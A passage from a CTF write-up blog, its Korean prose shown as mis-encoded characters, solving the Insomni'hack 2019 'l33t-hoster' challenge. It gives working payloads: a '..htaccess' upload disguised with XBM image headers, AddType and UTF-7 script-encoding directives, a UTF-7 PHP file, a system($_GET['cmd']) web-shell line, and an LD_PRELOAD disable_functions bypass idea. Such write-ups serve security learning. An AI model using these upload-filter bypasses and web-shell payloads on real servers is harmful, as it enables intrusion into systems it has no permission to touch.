ê·¸ëŸ¼ ì¼ë‹¨ íŒŒì¼ ì—…ë¡œë“œ ê¸°ëŠ¥ì´ ìˆìœ¼ë¯€ë¡œ <code>RCE(Remote Code Execution)</code>ì„ í•˜ê¸° ìœ„í•´ <code>php</code> íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ë©´ ë¬¸ì œë¥¼ ì«˜ë¼ë½ í’€ ìˆ˜ ìˆì„ ê²ƒ ê°™ë‹¤.
ê·¸ëŸ°ë° <code>php</code> í™•ì¥ìë¥¼ ë¹„ë¡¯í•´ì„œ php ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê±°ì˜ ëª¨ë“  í™•ì¥ì(ì¼ë‹¨ ë‚´ê°€ ìƒê°í•  ë• ì „ë¶€ì¸ ê²ƒ ê°™ì€ë°, í˜¹ì‹œ ì–´ë””ì„œ ë­ê°€ ë‚˜ì˜¬ì§€ ëª¨ë¥´ë¯€ë¡œ ê±°ì˜ ëª¨ë“ ì´ë¼ê³  ì“´ë‹¤.)ëŠ” <code>$disallowed_ext</code> ë³€ìˆ˜ ì•ˆì— ë“¤ì–´ìˆë‹¤.
ê·¸ë ‡ë‹¤ë©´ ë‹¤ë¥¸ í™•ì¥ìë¥¼ ì—…ë¡œë“œ í•˜ë”ë¼ë„ phpê°€ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ ë§Œë“¤ë©´ ë  ê²ƒ ê°™ë‹¤ ã…ã…</p>
<p>ì´ë¥¼ ìœ„í•´ì„œ <code>.htaccess</code>ë¥¼ ì—…ë¡œë“œ í•´ì•¼í•œë‹¤.
ê·¸ëŸ°ë° ì•ì„œ ë§í–ˆë“¯ì´, <code>.</code> ì•ì— ì•„ë¬´ëŸ° ë¬¸ìë„ ì—†ë‹¤ë©´ ì—…ë¡œë“œ í•  ìˆ˜ ì—†ë‹¤.
ì´ì— ì†ŒìŠ¤ì½”ë“œë¥¼ ë‹¤ì‹œ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ ë¶€ë¶„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    $parts = explode(&#34;.&#34;, $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }
</code></pre></td></tr></table>
</div>
</div><p>ì¦‰, ë§Œì•½ì— íŒŒì¼ ëª…ì„ <code>..htaccess</code>ë¼ê³  í•˜ë©´, <code>array_shift</code> í•œ ê²°ê³¼ê°€ ì•„ë˜ì™€ ê°™ì´ ë‚˜ì˜¨ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">Array
(
    [0] =&gt; 
)
</code></pre></td></tr></table>
</div>
</div><p>ë•Œë¬¸ì— <code>count($parts)</code>ëŠ” 1ì´ ë˜ì–´ <code>if(count($parts) === 0)</code> ë¶€ë¶„ì„ ê·¸ëƒ¥ ì§€ë‚˜ì³ê°ˆ ìˆ˜ ìˆë‹¤.
ë˜í•œ íŒŒì¼ì„ ì—…ë¡œë“œ í•  ë•Œ, <code>$name.&quot;.&quot;.$ext</code> í˜•íƒœë¡œ í•˜ëŠ”ë°, <code>$name</code>ì€ <code>$_FILES[&quot;image&quot;][&quot;name&quot;];</code>ì´ê¸° ë•Œë¬¸ì— ë¹ˆ ê°’ì´ ë  ê²ƒì´ê³ , <code>$ext</code>ëŠ” <code>array_pop($parts);</code>ì´ê¸° ë•Œë¬¸ì— <code>$parts</code>ì˜ ë§ˆì§€ë§‰ ê°’ì¸ <code>htaccess</code>ê°€ ë˜ì–´ ìµœì¢…ì ìœ¼ë¡œ <code>.htaccess</code>ì˜ ì´ë¦„ìœ¼ë¡œ ì—…ë¡œë“œ ë  ê²ƒì´ë‹¤.</p>
<p>ê·¸ëŸ¬ë©´ ì´ì œ ì•„ë˜ì™€ ê°™ì´ <code>.htaccess</code> íŒŒì¼ì„ êµ¬ì„±í•˜ì—¬ ì—…ë¡œë“œ í•˜ë©´, ë‚´ê°€ ì›í•˜ëŠ” <code>aaa</code>ë¼ëŠ” í™•ì¥ìë¥¼ <code>php</code>ë¡œ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìˆê²Œ ë  ê²ƒì´ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">AddType application/x-httpd-php .aaa
</code></pre></td></tr></table>
</div>
</div><p>ê·¸ëŸ°ë° í•œê°€ì§€ ë” ë¬¸ì œê°€ ìˆì—ˆë‹¤.
ë°”ë¡œ ìœ„ì˜ íŒŒì¼ì„ ì—…ë¡œë“œ í–ˆì„ ë•Œ, <code>exif_imagetype()</code>ë¥¼ í†µê³¼í•œ ê²°ê³¼ ìœ íš¨í•œ ì´ë¯¸ì§€ì˜ ê°’ì„ ë°˜í™˜ í•´ ì£¼ì–´ì•¼ í•œë‹¤ëŠ” ê²ƒì´ë‹¤.</p>
<p>ê·¸ë ‡ë‹¤ë©´ íŒŒì¼ì˜ í—¤ë”ë¥¼ ì´ë¯¸ì§€ íŒŒì¼ì²˜ëŸ¼ ë§ì¶°ì£¼ë©´ ë  ê²ƒ ê°™ì€ë°, ì§€ê¸ˆ ì—…ë¡œë“œ í•˜ëŠ” íŒŒì¼ì€ <code>.htaccess</code>ë¡œ ì‚¬ìš©ë˜ì–´ì•¼ í•˜ê¸° ë•Œë¬¸ì— <code>.htaccess</code>ì„ í•´ì„í•  ë•ŒëŠ” ë¬´ì‹œë  ìˆ˜ ìˆëŠ” ì´ë¯¸ì§€ íŒŒì¼ í—¤ë”ë¥¼ ì°¾ì•„ì•¼ í•œë‹¤.
ì¼ë‹¨ <code>exif_imagetype()</code> í•¨ìˆ˜ì—ì„œ ìœ íš¨í•œ ì´ë¯¸ì§€ë¡œ ì·¨ê¸‰í•˜ëŠ” í˜•íƒœëŠ” <a href="http://php.net/manual/en/function.exif-imagetype.php">ì—¬ê¸°</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.
ìµìˆ™í•œ í˜•íƒœê°€ ë³´ì´ëŠ”ë° ê·¸ ì¤‘, <code>IMAGETYPE_XBM</code>ë¥¼ <a href="https://en.wikipedia.org/wiki/X_BitMap#Format">ìœ„í‚¤í”¼ë””ì•„</a>ì—ì„œ ì°¾ì•„ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ ë¶€ë¶„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p>
<h3 id="format">Format</h3>
<p>XBM files differ markedly from most image files in that they take the form of C source files. This means that they can be compiled directly into an application without any preprocessing steps, but it also makes them far larger than their raw pixel data. The image data is encoded as a comma-separated list of byte values, each written in the C hexadecimal notation, &lsquo;0x13&rsquo; for example, so that multiple ASCII characters are used to express a single byte of image information.[4]</p>
<p>XBM data consists of a series of static unsigned char arrays containing the monochrome pixel data. When the format was in common use, an XBM typically appeared in headers (.h files) which featured one array per image stored in the header. The following piece of C code exemplifies an XBM file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 };
</code></pre></td></tr></table>
</div>
</div><p>ì¦‰, íŒŒì¼ì˜ ì‹œì‘ì€ <code>#</code>ìœ¼ë¡œ ì‹œì‘í•˜ë©°, ë‚´ê°€ íŒŒì¼ì˜ widthì™€ heightë„ ì„¤ì •í•  ìˆ˜ ìˆë‹¤.
ê·¸ëŸ°ë° <code>#</code> ë’¤ì˜ ë¬¸ìì—´ì€ <code>.htaccess</code>ì—ì„œ ì£¼ì„ìœ¼ë¡œ í•´ì„í•œë‹¤.</p>
<p>ë”°ë¼ì„œ <code>.htaccess</code> íŒŒì¼ ìƒë‹¨ì— <code>xbm</code> íŒŒì¼ì²˜ëŸ¼ <code>width</code>ì™€ <code>height</code>ì˜ í¬ê¸°ë¥¼ ì„¤ì • í•´ ì¤€ë‹¤ë©´, <code>exif_imagetype()</code>ë„ í†µê³¼í•˜ê³ , ë§ˆì§€ë§‰ì— ì´ë¯¸ì§€ì˜ ê°€ë¡œì™€ ì„¸ë¡œì˜ ê¸¸ì´ê°€ <code>1337</code> ì´ì–´ì•¼ í•˜ëŠ” ì¡°ê±´ë¬¸ì„ í†µê³¼í•˜ë©´ì„œ <code>.htaccess</code>ì—ì„œëŠ” í•´ë‹¹ ì¤„ì„ ì£¼ì„ìœ¼ë¡œ ì²˜ë¦¬ í•´ ë¬´ì‹œí•˜ê²Œ ë  ê²ƒì´ë‹¤.
ì´ ë‚´ìš©ë“¤ì„ ë°”íƒ•ìœ¼ë¡œ ë‹¤ì‹œ <code>.htaccess</code> íŒŒì¼ì˜ ë‚´ìš©ì„ êµ¬ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">#define test_width 1337
#define test_height 1337

AddType application/x-httpd-php .aaa
</code></pre></td></tr></table>
</div>
</div><p>ë‹¤ ëœ ê²ƒ ê°™ì•˜ëŠ”ë° ë˜ í•˜ë‚˜ì˜ ë¬¸ì œì ì´ ìˆì—ˆë‹¤.
ë°”ë¡œ <code>&lt;?</code>ë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ë‹¤ëŠ” ì ì´ì—ˆë‹¤.
ê·¸ë˜ì„œ <code>.htaccess</code>ì— ëŒ€í•´ì„œ ê²€ìƒ‰í•˜ë‹¤ê°€ ì¸í„°ë„·ì—ì„œ <a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">htaccess ì¹˜íŠ¸ì—”ì§„</a>ì„ ì°¾ì„ ìˆ˜ ìˆì—ˆë‹¤.
ë‚˜ëŠ” ì—¬ê¸°ì—ì„œ ì•„ë˜ì™€ ê°™ì€ ë¶€ë¶„ì„ ì‚¬ìš©í•˜ê¸°ë¡œ í–ˆë‹¤.</p>
<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_02.png" alt=""></p>
<p>ê·¸ë˜ì„œ ë³€ê²½ í•œ <code>.htaccess</code>ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<ul>
<li>.htaccess (ì—…ë¡œë“œ í•  ë•ŒëŠ” ..htaccess)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">#define test_width 1337
#define test_height 1337
AddType application/x-httpd-php .aaa
php_flag zend.multibyte 1
php_value zend.script_encoding &#34;UTF-7&#34;
</code></pre></td></tr></table>
</div>
</div><p>ê·¸ëŸ¼ ì´ì œ ìƒˆë¡œìš´ <code>.aaa</code> íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ëŠ”ë°, ì½”ë“œì˜ ë‚´ìš©ì„ <code>UTF-7</code>ë¡œ ì¸ì½”ë”© í•´ ì—…ë¡œë“œ í•˜ë©´ ì•„ë§ˆ ìë™ìœ¼ë¡œ <code>UTF-7</code> ë””ì½”ë”©ì„ í•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.
<code>code.aaa</code>ë¼ëŠ” íŒŒì¼ì„ ì•„ë˜ì™€ ê°™ì´ ë§Œë“¤ì—ˆë‹¤.</p>
<ul>
<li>code.aaa (ì›ë³¸)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">#define test_width 1337
#define test_height 1337
&lt;? phpinfo();
</code></pre></td></tr></table>
</div>
</div><ul>
<li>code.aaa (UTF-7 ë²„ì „)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">#define test_width 1337
#define test_height 1337
+ADw?php phpinfo()+ADs-
</code></pre></td></tr></table>
</div>
</div><p><code>UTF-7 ì¸ì½”ë”©</code>ì€ <a href="http://toolswebtop.com/text/process/encode/utf-7">ì—¬ê¸°</a>ì—ì„œ í–ˆë‹¤.
íŒŒì¼ ë‘ê°œë¥¼ ì—…ë¡œë“œ í•œ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì´ ë“œë””ì–´ <code>phpinfo()</code>ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆì—ˆë‹¤!</p>
<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_03.png" alt=""></p>
<p>ê·¸ë˜ì„œ ê·¸ëƒ¥ <code>code.aaa</code>ì— <code>&lt;?php system($_GET['cmd']);</code>ë¥¼ ë„£ìœ¼ë©´ ë˜ì§€ ì•Šì„ê¹Œ í–ˆëŠ”ë° ì•ˆë˜ë”ë¼&hellip;
<code>phpinfo()</code>ì—ì„œ ë‹¤ì‹œ ë³´ë‹ˆê¹Œ <code>disable_functions</code>ì— system ë¶€í„° ì‹œì‘í•´ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ë“¤ì´ ë‹¤ ë“¤ì–´ê°€ìˆë‹¤. (ëˆ™ë¬¼&hellip;)</p>
<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_04.png" alt=""></p>
<p>ê·¸ë˜ì„œ ì¸í„°ë„·ì„ ë’¤ì§€ë‹¤ í•œ ê°€ì§€ ë°©ë²•ì„ ì°¾ì•˜ëŠ”ë°, ë°”ë¡œ <code>mail()</code> í•¨ìˆ˜ì™€ <code>putenv()</code> í•¨ìˆ˜ë¥¼ ì´ìš© í•´ <code>.so</code> íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ì—¬ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒì´ë‹¤.</p>
<blockquote>
<p><a href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">How to bypass disable_functions and open_basedir</a></p>
</blockquote>
<p>ê°™ì€ ë‚´ìš©ì¸ë° ì¤‘êµ­ì–´ë¡œ ì íŒ <a href="https://www.freebuf.com/articles/web/192052.html">ë¸”ë¡œê·¸ ê¸€</a>ë„ ìˆì—ˆë‹¤. ì—¬ê¸°ê°€ ì†ŒìŠ¤ì½”ë“œëŠ” ë” ê¹”ë”í•˜ê²Œ ìˆëŠ” ê²ƒ ê°™ë‹¤.
<code>php</code>ì—ì„œ <code>mail()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ, <code>execve</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤ê³  í•œë‹¤.
ë•Œë¬¸ì— ë‚´ê°€ ë§Œì•½ <code>.so</code> íŒŒì¼ì„ ì—…ë¡œë“œ í•˜ê³ , <code>putenv()</code>ë¥¼ í†µí•´ <code>LD_PRELOAD</code>ë¥¼ ë‚´ê°€ ì—…ë¡œë“œ í•œ <code>.so</code> íŒŒì¼ë¡œ ë³€ê²½í•  ìˆ˜ ìˆë‹¤ë©´, ì›í•˜ëŠ” ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ëœë‹¤.</p>
<p>ê·¼ë°&hellip; ì—¬ê¸°ê¹Œì§€ í•˜ê³  ê¸‰í•œ ì¼ì„ í•´ê²°í•˜ê³  ë³´ë‹ˆ ì„œë²„ê°€ ë‹«í˜”ë‹¤&hellip; ã… ã… 
ê·¸ëƒ¥ ê¸‰í•œ ì¼ì„ ë¯¸ë¤„ë‘ê³  ë¬¸ì œë¶€í„° í’€ ê±¸ ê·¸ë¬ë‹¤ ã… ã… 
ë§Œì•½ ë‚˜ì¤‘ì— ê¸°íšŒê°€ ëœë‹¤ë©´ ì´ ë‚´ìš©ì„ ì‹¤ìŠµí•´ì„œ ë”°ë¡œ ì˜¬ë¦¬ëŠ” ê²ƒìœ¼ë¡œ í•˜ê³  ì´ Write upì€ ì—¬ê¸°ê¹Œì§€ë§Œ í•´ì•¼í•  ê²ƒ ê°™ë‹¤.</p></section>
    <footer>
    <div class="tags">
        
        <a href="https://mingzz1.github.io//tags#Write-up">#Write-up</a>
        
        <a href="https://mingzz1.github.io//tags#CTF">#CTF</a>
        
        <a href="https://mingzz1.github.io//tags#insomnihack2019">#insomnihack2019</a>
        
    </div>
</footer>
</article>

<div class="comments">
    <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'mingzzis-blog';
    (function () {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
</div>

<div id="post-nav">
    <div id="previous-post" class="post-nav-post">
        
        <p>Previous post</p>
        <a href="https://mingzz1.github.io/ctf/2018/2018/12/30/ctf-35c3ctf2018-php.html/">[35C3 CTF 2018] php Write up</a>
        
    </div>

    <div id="next-post" class="post-nav-post">
        
        <p>Next post</p>
        <a href="https://mingzz1.github.io/wargame/wargame.kr/2019/02/08/wargame.kr-DB_is_really_GOOD.html/">[Wargame.kr] DB is really GOOD ë¬¸ì œí’€ì´</a>
        
    </div>
</div>


    </div>
    <ul class='social'>
    
    <li>
        <a href="https://github.com/mingzz1" class="icon alt" target="_blank">
            <i class="fa fa-github fa-2x"></i>
        </a>
    </li>
    
    <li>
        <a href="https://www.linkedin.com/in/minji-kim-12986a145/" class="icon alt" target="_blank">
            <i class="fa fa-linkedin fa-2x"></i>
        </a>
    </li>
    
</ul>
<footer class="site-footer">
    <p ckass="text">Powered by <a href="https://mingzz1.github.io" target="_blank">mingzzi</a> with <a
            href="https://skye3133.github.io/" target="_blank">myund</a></p>
</footer>

    <script id="dsq-count-scr" src="//mingzzis-blog.disqus.com/count.js" async></script>

    
<script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-130304424-1']);
    _gaq.push(['_trackPageview']);
    (function () {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
</script>
    
</body>
</body>

</html>